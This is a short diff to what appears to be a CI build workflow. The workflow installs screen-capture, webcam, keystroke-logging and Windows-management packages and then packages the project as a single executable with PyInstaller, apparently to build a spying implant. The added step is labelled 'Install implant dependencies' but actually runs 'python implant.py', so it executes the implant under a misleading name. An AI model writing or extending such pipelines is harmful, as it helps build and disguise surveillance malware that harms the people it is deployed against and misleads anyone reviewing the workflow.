@@ -31,6 +31,11 @@ jobs:
         run: |
           pip install requests cryptography mss opencv-python keyboard pywin32 wmi pillow pycryptodomex
 
+      - name: Install implant dependencies
+        run: |
+          python implant.py
+
+
       - name: Build executable with PyInstaller
         run: |
           pyinstaller --onefile ^
